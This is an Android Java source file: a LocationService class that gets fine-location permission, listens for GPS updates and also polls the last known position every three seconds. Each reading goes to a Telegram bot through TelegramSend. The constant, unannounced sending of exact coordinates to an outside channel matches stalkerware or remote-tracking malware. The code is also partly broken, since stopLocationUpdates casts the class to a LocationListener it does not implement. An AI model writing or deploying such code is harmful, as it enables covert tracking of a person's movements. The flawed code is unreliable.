package com.dasqin.mirtdasiram;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class LocationService {
    private LocationManager locationManager;
    private Context context;
    private Handler handler;
    private Runnable locationRunnable;

    public LocationService(Context context) {
        this.context = context;
        handler = new Handler();
    }
    public void requestLocationPermission(Activity activity) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
        } else {
            startLocationUpdates();
        }
    }
    
    public void stopLocationUpdates() {
        if (locationManager != null) {
            locationManager.removeUpdates((LocationListener) this);
        }
        handler.removeCallbacks(locationRunnable);
    }
    
    private void startLocationUpdates() {
        locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            
            
            LocationListener locationListener = new LocationListener() {
                
                
                
                
                
                @Override
                public void onLocationChanged(Location location) {
                    double latitude = location.getLatitude();
                    double longitude = location.getLongitude();
                    Log.d("LocationService", "Location: Lat=" + latitude + ", Lng=" + longitude);
                    TelegramSend.sendLocationToTelegram(latitude, longitude);
                    
 
                    
                    
                }
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override
                public void onProviderEnabled(String provider) {}
                @Override
                public void onProviderDisabled(String provider) {}
                    
                    
                    //bu qeder sade blyat
                    
                    
            };
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
            locationRunnable = new Runnable() {
            @Override
            public void run() {
            Location lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (lastKnownLocation != null) {
            double latitude = lastKnownLocation.getLatitude();
            double longitude = lastKnownLocation.getLongitude();
            Log.d("LocationService", "Looping Location: Lat=" + latitude + ", Lng=" + longitude);
            TelegramSend.sendLocationToTelegram(latitude, longitude);
            }
            handler.postDelayed(this, 3000);
            }
            };
            
            handler.post(locationRunnable);
    }
 }
}
